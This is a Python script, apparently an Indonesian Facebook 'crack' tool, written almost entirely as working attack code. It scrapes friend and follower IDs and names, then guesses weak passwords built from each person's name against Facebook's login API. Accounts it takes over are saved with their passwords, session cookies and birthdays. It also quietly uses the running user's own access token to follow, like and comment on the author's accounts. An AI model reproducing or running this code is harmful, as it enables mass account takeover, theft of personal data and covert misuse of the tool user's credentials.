#!/usr/bin/python
import os,re,sys,bs4,time,random,datetime,requests
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from time import sleep

# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')

# Banner
___banner___ = ("""%s ____%s Created by : rozhak\n%s|  _ \ _   _ _ __ ___  _ __\n| | | | | | | '_ ` _ \| '_ \ \n%s| |_| | |_| | | | | | | |_) |\n|____/ \__,_|_| |_| |_| .__/
                      |_|
"""%(H,P,H,B))

loop = 0
ok = []
cp = []

# Useragent
ua_nokia=('Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530')
ua_xiaomi=('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36')
ua_samsung=('Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36')
ua_macos=('Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15')
ua_vivo=('Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36')
ua_oppo=('Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36')
ua_huawei=('Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36')
ua_redmi4a=('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36')
ua_vivoy12=('Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36')
ua_nokiax=('NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')
ua_asus=('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')
ua_galaxys10=('Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36')
ua_lenovo=('Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36')
ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huawei,ua_redmi4a,ua_vivoy12,ua_nokiax,ua_asus,ua_galaxys10,ua_lenovo])
# Login
def ___login___():
    os.system('clear')
    print(___banner___)
    print("%s[%s!%s]%s Anda Harus Memasukan Token Facebook, Sebainya Gunakan Akun Baru Untuk Login, Jika Anda Belum Mengetahui Token Facebook Ketik %s{%sOpen%s}\n"%(H,P,H,P,H,K,H))
    try:
        ___token = input("%s[%s?%s]%s Token :%s "%(B,P,B,P,H))
        if ___token in ['open','Open']:
            print("%s[%s?*%s]%s Anda Akan Diarahkan Ke Youtube!"%(K,P,K,P))
            os.system('xdg-open https://youtu.be/3Y6xsMB3wRg')
            exit()
        else:
            ___get = requests.get('https://graph.facebook.com/me/?access_token={}'.format(___token)).json()['name']
            open('login.txt','w').write(___token)
            print("%s[%s*%s]%s Welcome :%s %s"%(H,P,H,P,K,___get))
            ___follow___()
    except (KeyError):
        print("%s[%s!%s]%s Token Salah"%(M,P,M,P));sleep(3);___login___()
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))
# Bot Follow
def ___follow___():
    try:
        ___token = open('login.txt', 'r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(M,P,M,P));sleep(2);___login___()
    try:
        # Kalau Mau Di Ganti Izin Dulu!
        ___zed = datetime.datetime.now()
        ___waktu = ___zed.strftime('%A, %d %B %Y/%H.%M.%S')
        ___kata___ = random.choice(['Hidup ini terdiri dari 10 persen apa yang terjadi padamu dan 90 persen bagaimana caramu menyikapinya. - Charles R. Swindoll','Sukses tampaknya terkait dengan tindakan. Orang sukses terus bergerak. Mereka membuat kesalahan, tetapi mereka tidak berhenti. - Conrad Hilton','Keberanian adalah apa yang diperlukan untuk berdiri dan berbicara. Keberanian juga diperlukan untuk duduk dan mendengarkan. - Winston Churchill','Berani bermimpi, tapi yang lebih penting, berani melakukan tindakan di balik impianmu. - Josh Hinds','Kegagalan tidak akan pernah menyusul jika tekad untuk sukses cukup kuat. - Og Mandino','Hidup menyusut atau berkembang sebanding dengan keberanian seseorang. - Anais Nin','Ada dua cara untuk menyebarkan cahaya: menjadi lilin atau cermin yang memantulkannya. - Edith Wharton','Kesempatan itu mirip seperti matahari terbit. Kalau kau menunggu terlalu lama, kau bisa melewatkannya. - William Arthur Ward','Kebahagiaan bukanlah sesuatu yang siap dibuat. Itu berasal dari tindakan Anda sendiri. - Dalai Lama'])
        ___komen___ = ('I Love You @[757953543:] \n\n'+___kata___+'\n'+___waktu)
        ___komen2___ = ('I Love You @[757953543:]\n\n'+___kata___+'\n'+___waktu)
        ___komen3___ = random.choice(['Hello Bang','Mantap Bang','Keren Bang','Very Nice','Programmer Bang?','Hallo Bang','Luar Biasa'])
        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=%s'%(___token)) #rozhak
        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=%s'%(___token)) #rozhak2
        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=%s'%(___token)) #muhammad rozhak
        requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=%s'%(___token)) #foto sampul
        requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=%s'%(___token)) # foto profil
        requests.post('https://graph.facebook.com/10158807643598544/comments/?message=%s&access_token=%s'%(___komen3___,___token)) #foto sampul
        requests.post('https://graph.facebook.com/10159090813023544/comments/?message=%s&access_token=%s'%(___komen___,___token)) #foto profil
        requests.post('https://graph.facebook.com/10159494942223544/comments/?message=%s&access_token=%s'%(___komen2___,___token)) #foto profil
        requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(___token)) # Iwan
    except:
        exit("%s[%s!%s]%s Login Gagal"%(M,P,M,P))
    print("%s[%s*%s]%s Login Berhasil"%(H,P,H,P))
    ___menu___()
# Daftar Menu
def ___menu___():
    try:
        ___token = open('login.txt','r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(M,P,M,P));sleep(3);___login___()
    try:
        ___get = requests.get('https://graph.facebook.com/me/?access_token={}'.format(___token)).json()['name']
        os.system('clear')
        print(___banner___)
        print("%s[%s•%s]%s Welcome :%s %s"%(H,P,H,P,K,___get))
        try:
            ___gep = requests.get('http://ipinfo.io/json').json()
            print("%s[%s•%s]%s Region :%s %s"%(H,P,H,P,K,___gep['region']))
            print("%s[%s•%s]%s Ip :%s %s\n"%(H,P,H,P,K,___gep['ip']))
        except:
            print("%s[%s•%s]%s Region :%s -"%(H,P,H,P,K))
            print("%s[%s•%s]%s Ip :%s -\n"%(H,P,H,P,K))
    except (KeyError):
        print("%s[%s!%s]%s Token Invalid"%(M,P,M,P));sleep(3);os.system('rm -rf login.txt');___login___()
    except (ConnectionError):
        exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))
    print("%s[%s1%s]%s Dump ID Follower Acak %s{%s04-22%s}"%(B,P,B,P,B,P,B))
    print("%s[%s2%s]%s Dump ID Follower Old %s{%s04-09%s}"%(B,P,B,P,B,P,B))
    print("%s[%s3%s]%s Dump ID Follower New %s{%s20-22%s}"%(B,P,B,P,B,P,B))
    print("%s[%s4%s]%s Dump ID Publik Acak %s{%s04-22%s}"%(B,P,B,P,B,P,B))
    print("%s[%s5%s]%s Dump ID Publik Old %s{%s04-09%s}"%(B,P,B,P,B,P,B))
    print("%s[%s6%s]%s Dump ID Publik New %s{%s20-22%s}"%(B,P,B,P,B,P,B))
    print("%s[%s7%s]%s Mulai Crack %s{%sSlow%s}"%(B,P,B,P,B,K,B))
    print("%s[%sA%s]%s Cek Opsi Chekpoint"%(B,P,B,P))
    print("%s[%s8%s]%s Lihat Hasil Crack"%(B,P,B,P))
    print("%s[%s9%s]%s Remove Token\n"%(B,P,B,P))
    ___pilih = input("%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
    if ___pilih in ['1','01']:
        ___acak___()
    elif ___pilih in ['2','02']:
        ___old___()
    elif ___pilih in ['3','03']:
        ___new___()
    elif ___pilih in ['4','04']:
        ___acak2___()
    elif ___pilih in ['5','05']:
        ___old2___()
    elif ___pilih in ['6','06']:
        ___new2___()
    elif ___pilih in ['7','7']:
        ___password___()
    elif ___pilih in ['a','A']:
        ___opsi___()
    elif ___pilih in ['8','8']:
        print("\n%s[%s1%s]%s Lihat Hasil Ok"%(B,P,B,P))
        print("%s[%s2%s]%s Lihat Hasil Cp"%(B,P,B,P))
        print("%s[%s3%s]%s Kembali"%(B,P,B,P))
        ___hasil = input("\n%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))
        if ___hasil in ['1','01']:
            print("%s "%(H));os.system('cat Results/Ok.txt');exit()
        elif ___hasil in ['2','02']:
            print("%s "%(K));os.system('cat Results/Cp.txt');exit()
        elif ___hasil in ['03','03']:
            ___menu___()
        else:
            exit("%s[%s!%s]%s Wrong Input"%(M,P,M,P))
    elif ___pilih in ['9','09']:
        print("%s[%s!%s]%s Menghapus Token"%(K,P,K,P));os.system('rm -rf login.txt');exit()
    else:
        exit("%s[%s!%s]%s Wrong Input"%(M,P,M,P))
# Dump Follower Acak
def ___acak___():
        try:
            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:
                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']
                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))
                print("%s "%(P))
            else:
                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))
        except (KeyError):
            exit("%s[%s!%s]%s User Error"%(M,P,M,P))
        try:
            ___file = ___get.replace(' ','_')+'.txt'
            ___files = open('Dump/'+___file,'w')
            for z in requests.get('https://graph.facebook.com/{}/subscribers?access_token={}&limit=5000'.format(___user,open('login.txt','r').read())).json()['data']:
                ___files.write(z['id']+'<=>'+z['name']+' \n')
                print('\r'+z['id']+'<=>'+z['name'])
            ___files.close()
            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))
            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))
# Dump Follower Old
def ___old___():
        try:
            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:
                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']
                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))
                print("%s "%(P))
            else:
                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))
        except (KeyError):
            exit("%s[%s!%s]%s User Error"%(M,P,M,P))
        try:
            ___file = ___get.replace(' ','_')+'.txt'
            ___files = open('Dump/'+___file,'a')
            for z in requests.get('https://graph.facebook.com/{}/subscribers?access_token={}&limit=5000'.format(___user,open('login.txt','r').read())).json()['data']:
                if len(z['id'])==1 or len(z['id'])==2 or len(z['id'])==3 or len(z['id'])==4 or len(z['id'])==5 or len(z['id'])==6 or len(z['id'])==7 or len(z['id'])==8 or len(z['id'])==9 or len(z['id'])==10:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
                elif z['id'][:10] in ['1000000000']:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
                elif z['id'][:9] in ['100000000']:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
                elif z['id'][:8] in ['10000000']:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
                elif z['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
            ___files.close()
            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))
            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))
# Dump Follower New
def ___new___():
        try:
            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:
                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']
                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))
                print("%s "%(P))
            else:
                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))
        except (KeyError):
            exit("%s[%s!%s]%s User Error"%(M,P,M,P))
        try:
            ___file = ___get.replace(' ','_')+'.txt'
            ___files = open('Dump/'+___file,'a')
            for z in requests.get('https://graph.facebook.com/{}/subscribers?access_token={}&limit=5000'.format(___user,open('login.txt','r').read())).json()['data']:
                if z['id'][:5] in ['10005','10006','10007','10008']:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
            ___files.close()
            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))
            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))
# Dump Publik Acak
def ___acak2___():
        try:
            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:
                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']
                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))
                print("%s "%(P))
            else:
                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))
        except (KeyError):
            exit("%s[%s!%s]%s User Error"%(M,P,M,P))
        try:
            ___file = ___get.replace(' ','_')+'.txt'
            ___files = open('Dump/'+___file,'a')
            for z in requests.get('https://graph.facebook.com/{}?fields=friends.limit(5000)&access_token={}'.format(___user,open('login.txt','r').read())).json()['friends']['data']:
                ___files.write(z['id']+'<=>'+z['name']+' \n')
                print('\r'+z['id']+'<=>'+z['name'])
            ___files.close()
            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))
            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))
# Dump Publik Old
def ___old2___():
        try:
            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:
                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']
                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))
                print("%s "%(P))
            else:
                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))
        except (KeyError):
            exit("%s[%s!%s]%s User Error"%(M,P,M,P))
        try:
            ___file = ___get.replace(' ','_')+'.txt'
            ___files = open('Dump/'+___file,'a')
            for z in requests.get('https://graph.facebook.com/{}?fields=friends.limit(5000)&access_token={}'.format(___user,open('login.txt','r').read())).json()['friends']['data']:
                if len(z['id'])==1 or len(z['id'])==2 or len(z['id'])==3 or len(z['id'])==4 or len(z['id'])==5 or len(z['id'])==6 or len(z['id'])==7 or len(z['id'])==8 or len(z['id'])==9 or len(z['id'])==10:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
                elif z['id'][:10] in ['1000000000']:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
                elif z['id'][:9] in ['100000000']:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
                elif z['id'][:8] in ['10000000']:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
                elif z['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
            ___files.close()
            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))
            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))
# Dump Publik New
def ___new2___():
        try:
            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))
            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:
                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']
                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))
                print("%s "%(P))
            else:
                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))
        except (KeyError):
            exit("%s[%s!%s]%s User Error"%(M,P,M,P))
        try:
            ___file = ___get.replace(' ','_')+'.txt'
            ___files = open('Dump/'+___file,'a')
            for z in requests.get('https://graph.facebook.com/{}?fields=friends.limit(5000)&access_token={}'.format(___user,open('login.txt','r').read())).json()['friends']['data']:
                if z['id'][:5] in ['10005','10006','10007','10008']:
                    ___files.write(z['id']+'<=>'+z['name']+' \n')
                    print('\r'+z['id']+'<=>'+z['name'])
            ___files.close()
            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))
            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))
            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))
        except (ConnectionError):
            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))
# Pilih Password
def ___password___():
    ___cek = input("\n%s[%s?%s]%s Gunakan Password Manual {y/t} :%s "%(B,P,B,P,H))
    if ___cek in ['y','Y']:
        with ThreadPoolExecutor(max_workers=35) as (___hayuk):
            try:
                ___file = input ("%s[%s?%s]%s File Dump :%s "%(B,P,B,P,H))
                ___files = open(___file,'r').read().splitlines()
                ___pws = input("%s[%s?%s]%s Password :%s "%(B,P,B,P,H)).split(',')
                print("%s "%(P))
            except (IOError):
                exit("%s[%s!%s]%s File Tidak Ada"%(M,P,M,P))
            for ___user in ___files:
                uid, name = ___user.split('<=>')
                ___hayuk.submit(___api___, ___files, uid, ___pws)
        os.remove(___file);exit("\n%s{%sSelesai%s}%s"%(H,P,H,P))
    elif ___cek in ['t','T']:
        with ThreadPoolExecutor(max_workers=35) as (___hayuk):
            try:
                ___file = input ("%s[%s?%s]%s File Dump :%s "%(B,P,B,P,H))
                ___files = open(___file,'r').read().splitlines()
                print("%s[%s?%s]%s Total ID :%s %s"%(B,P,B,P,H,len(___files)))
            except (IOError):
                exit("%s[%s!%s]%s File Tidak Ada"%(M,P,M,P))
            print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di Results/Ok.txt"%(H,P,H,P))
            print("%s[%s•%s]%s Hasil Cp Tersimpan Di Results/Cp.txt\n"%(H,P,H,P))
            for ___user in ___files:
                uid, name = ___user.split('<=>')
                z = name.split(' ')
                if len(z)==2 or len(z)==3 or len(z)==4 or len(z)==5 or len(z)==6:
                    pwx = [name, z[0]+'123', z[1]+'123', z[0]+'1234', z[1]+'1234', z[0]+'12345', z[1]+'12345', z[0]+'123456', z[1]+'123456', 'Sayang', 'Bismillah']
                else:
                    pwx = [name, z[0]+'123', z[1]+'123', z[0]+'1234', z[1]+'1234', z[0]+'12345', z[1]+'12345', z[0]+'123456', z[1]+'123456', 'Sayang', 'Bismillah']
                ___hayuk.submit(___api___, ___files, uid, pwx)
        os.remove(___file);exit("\n%s{%sSelesai%s}%s"%(H,P,H,P))
# Crack Api Facebook
def ___api___(total, uid, pwx):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(total), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
            if 'session_key' in send.text and 'EAAA' in send.text:
                print("\r\x1b[1;92m[Ok] %s|%s|%s\x1b[1;97m"%(uid, pw, send.json()['access_token']))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif 'www.facebook.com' in send.json()['error_msg']:
                try:
                    ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(uid,open('login.txt','r').read())).json()['birthday'];bulan, hari, tahun = ___get.split('/')
                    ___lahir = (hari+'/'+bulan+'/'+tahun)
                except (KeyError,IOError):
                    ___lahir = ('          ')
                except:pass
                print("\r\x1b[1;93m[Cp] %s|%s|%s\x1b[1;97m"%(uid, pw,___lahir))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s|%s\n"%(uid, pw,___lahir))
                break
            else:
                continue
        loop +=1
    except (ConnectionError):
        sys.stdout.write(
            "\r\x1b[1;93m[\x1b[1;97m!\x1b[1;93m]\x1b[1;97m Koneksi Error                "
        ); sys.stdout.flush();sleep(7)
        ___api___(total, uid, pwx)
# Chek Opsi Chekpoint
def ___opsi___():
    ___file = input("\n%s[%s?%s]%s File :%s "%(B,P,B,P,H))
    if ___file in ['',' ']:
        exit("%s[%s!%s]%s Jangan Kosong"%(M,P,M,P))
    try:
        ___files = open(___file,'r').read().splitlines()
    except (IOError):
        exit("%s[%s!%s]%s File Tidak Ada"%(M,P,M,P))
    print("%s[%s?%s]%s Total Akun :%s %s"%(B,P,B,P,H,len(___files)))
    print("\n%s[%s•%s]%s Akun Ok Tersimpan Di Opsi/Ok.txt"%(H,P,H,P))
    print("%s[%s•%s]%s Akun Cp Tersimpan Di Opsi/Cp.txt\n"%(H,P,H,P))
    for ___list in ___files:
        try:
            ___user, ___pasw, ___lahir = ___list.split('|')
            print("%s[%s*%s]%s Check :%s %s|%s|%s"%(B,P,B,P,K,___user,___pasw,___lahir))
            ___start___(___user, ___pasw)
        except (ValueError):
            exit("%s[%s!%s]%s Separator Error"%(M,P,M,P))
    exit("\n%s{%sSelesai%s}%s"%(H,P,H,P))
def ___start___(user, pasw):
    mb = ("https://mbasic.facebook.com")
    ses = requests.Session()
    ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    data = {}
    ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:continue
    data.update({"email":user,"pass":pasw})
    run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    if "c_user" in ses.cookies:
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
        xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
        print(" \x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97m Aplikasi Terhubung :\x1b[1;92m "+str(len(xe)))
        num = 0
        for _ in xe:
            num += 1
            print("    \x1b[1;92m[\x1b[1;97m"+str(num)+"\x1b[1;92m]\x1b[1;97m "+_[0][0]+"\x1b[1;97m,\x1b[1;92m "+_[0][1])
        open('Opsi/Ok.txt','a').write('%s|%s|%s\n'%(user,pasw,kuki))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
        parr = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        zexe = [yy.text for yy in parr.find_all("option")]
        if str(len(zexe)) == '0':
            print("    \x1b[1;92m[\x1b[1;97m*\x1b[1;92m]\x1b[1;97mAkun Tap Yes")
        else:
            for opt in range(len(zexe)):
                print("    \x1b[1;93m[\x1b[1;97m"+str(opt+1)+"\x1b[1;93m]\x1b[1;97m "+zexe[opt])
        open('Opsi/Cp.txt','a').write('%s|%s\n'%(user,pasw))
    elif "login_error" in str(run):
        err = run.find("div",{"id":"login_error"}).find("div").text
        print("    \x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m %s"%(err))
    else:
        print("    \x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Login gagal periksa username atau password")

if __name__=='__main__':
    os.system('git pull')
    ___menu___()
